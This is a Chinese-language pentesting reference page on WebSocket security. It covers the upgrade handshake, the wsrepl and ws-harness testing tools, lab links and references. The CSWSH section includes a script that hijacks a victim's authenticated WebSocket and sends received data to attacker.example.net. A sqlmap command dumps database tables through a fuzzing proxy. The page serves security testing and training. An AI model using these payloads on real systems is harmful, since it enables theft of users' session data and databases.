[原文文档](README.en.md)

# Web Sockets

> WebSocket是一种通信协议，通过单个持久连接提供全双工通信通道。这使得客户端（通常是Web浏览器）和服务器之间能够通过持久连接进行实时的双向通信。WebSocket通常用于需要频繁、低延迟更新的Web应用程序，例如实时聊天应用程序、在线游戏、实时通知和金融交易平台。

## 摘要

* [工具](#工具)
* [方法论](#方法论)
    * [Web Socket协议](#web-socket协议)
    * [SocketIO](#socketio)
    * [使用wsrepl](#使用wsrepl)
    * [使用ws-harness.py](#使用ws-harnesspy)
* [跨站WebSocket劫持(CSWSH)](#跨站websocket劫持cswsh)
* [实验室](#实验室)
* [参考资料](#参考资料)

## 工具

* [doyensec/wsrepl](https://github.com/doyensec/wsrepl) - 渗透测试人员的WebSocket REPL
* [mfowl/ws-harness.py](https://gist.githubusercontent.com/mfowl/ae5bc17f986d4fcc2023738127b06138/raw/e8e82467ade45998d46cef355fd9b57182c3e269/ws.harness.py)
* [PortSwigger/websocket-turbo-intruder](https://github.com/PortSwigger/websocket-turbo-intruder) - 使用自定义Python代码对WebSocket进行模糊测试
* [snyk/socketsleuth](https://github.com/snyk/socketsleuth) - Burp扩展，为基于WebSocket的应用程序渗透测试添加额外功能

## 方法论

### Web Socket协议

WebSocket从普通的`HTTP/1.1`请求开始，然后将连接升级为使用WebSocket协议。

客户端发送一个特殊构造的HTTP请求，其头部表示它想要切换到WebSocket协议：

```http
GET /chat HTTP/1.1
Host: example.com:80
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```

服务器响应`HTTP 101 Switching Protocols`。如果服务器接受请求，它会这样回复：

```http
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

### SocketIO

Socket.IO是一个JavaScript库（适用于客户端和服务器），它提供了WebSocket的更高级抽象，旨在使跨浏览器和环境的实时通信更容易和更可靠。

### 使用wsrepl

`wsrepl`是由Doyensec开发的工具，旨在简化基于WebSocket的应用程序的审计。它提供了一个交互式REPL界面，用户友好且易于自动化。该工具是在与一个客户的合作期间开发的，该客户的Web应用程序严重依赖WebSocket进行软实时通信。

wsrepl旨在在交互式REPL体验和自动化之间提供平衡。它基于Python的TUI框架Textual构建，并与curl的参数互操作，使得从Burp中的升级请求轻松过渡到wsrepl。它还根据RFC 6455提供WebSocket操作码的完全透明性，并在断连时具有自动重连功能。

```ps1
pip install wsrepl
wsrepl -u URL -P auth_plugin.py
```

此外，wsrepl简化了过渡到WebSocket自动化的过程。用户只需编写一个Python插件。插件系统设计为灵活，允许用户定义在WebSocket生命周期的各个阶段执行的钩子（init、on_message_sent、on_message_received等）。

```py
from wsrepl import Plugin
from wsrepl.WSMessage import WSMessage

import json
import requests

class Demo(Plugin):
    def init(self):
        token = requests.get("https://example.com/uuid").json()["uuid"]
        self.messages = [
            json.dumps({
                "auth": "session",
                "sessionId": token
            })
        ]

    async def on_message_sent(self, message: WSMessage) -> None:
        original = message.msg
        message.msg = json.dumps({
            "type": "message",
            "data": {
                "text": original
            }
        })
        message.short = original
        message.long = message.msg

    async def on_message_received(self, message: WSMessage) -> None:
        original = message.msg
        try:
            message.short = json.loads(original)["data"]["text"]
        except:
            message.short = "Error: could not parse message"

        message.long = original
```

### 使用ws-harness.py

启动`ws-harness`来监听web-socket，并指定要发送到端点的消息模板。

```powershell
python ws-harness.py -u "ws://dvws.local:8080/authenticate-user" -m ./message.txt
```

消息内容应包含**[FUZZ]**关键字。

```json
{
    "auth_user":"dGVzda==",
    "auth_pass":"[FUZZ]"
}
```

然后您可以对新创建的web服务使用任何工具，充当代理并动态篡改通过websocket发送的消息内容。

```python
sqlmap -u http://127.0.0.1:8000/?fuzz=test --tables --tamper=base64encode --dump
```

## 跨站WebSocket劫持(CSWSH)

如果WebSocket握手没有使用CSRF令牌或nonce正确保护，则可以在攻击者控制的网站上使用用户的经过身份验证的WebSocket，因为Cookie由浏览器自动发送。这种攻击称为跨站WebSocket劫持(CSWSH)。

托管在攻击者服务器上的示例漏洞利用，它将WebSocket接收到的数据泄露给攻击者：

```html
<script>
  ws = new WebSocket('wss://vulnerable.example.com/messages');
  ws.onopen = function start(event) {
    ws.send("HELLO");
  }
  ws.onmessage = function handleReply(event) {
    fetch('https://attacker.example.net/?'+event.data, {mode: 'no-cors'});
  }
  ws.send("Some text sent to the server");
</script>
```

您必须根据您的确切情况调整代码。例如，如果您的web应用程序在握手请求中使用`Sec-WebSocket-Protocol`头部，则您必须将此值作为`WebSocket`函数调用的第二个参数添加，以添加此头部。

## 实验室

* [PortSwigger - 操作WebSocket消息以利用漏洞](https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities)
* [PortSwigger - 跨站WebSocket劫持](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)
* [PortSwigger - 操作WebSocket握手以利用漏洞](https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities)
* [Root Me - Web Socket - 0 protection](https://www.root-me.org/en/Challenges/Web-Client/Web-Socket-0-protection)

## 参考资料

* [使用socketio进行跨站WebSocket劫持 - Jimmy Li - 2020年8月17日](https://blog.jimmyli.us/articles/2020-08/Cross-Site-WebSocket-Hijacking-With-SocketIO)
* [黑客Web Sockets：欢迎所有Web渗透测试工具 - Michael Fowl - 2019年3月5日](https://web.archive.org/web/20190306170840/https://www.vdalabs.com/2019/03/05/hacking-web-sockets-all-web-pentest-tools-welcomed/)
* [使用WebSockets进行黑客攻击 - Mike Shema, Sergey Shekyan, Vaagn Toukharian - 2012年9月20日](https://media.blackhat.com/bh-us-12/Briefings/Shekyan/BH_US_12_Shekyan_Toukharian_Hacking_Websocket_Slides.pdf)
* [小型WebSocket CTF - Snowscan - 2020年1月27日](https://snowscan.io/bbsctf-evilconneck/#)
* [使用wsrepl简化WebSocket渗透测试 - Andrez Konstantinov - 2023年7月18日](https://blog.doyensec.com/2023/07/18/streamlining-websocket-pentesting-with-wsrepl.html)
* [测试WebSockets安全漏洞 - PortSwigger - 2019年9月28日](https://portswigger.net/web-security/websockets)
* [WebSocket攻击 - HackTricks - 2024年7月19日](https://book.hacktricks.xyz/pentesting-web/websocket-attacks)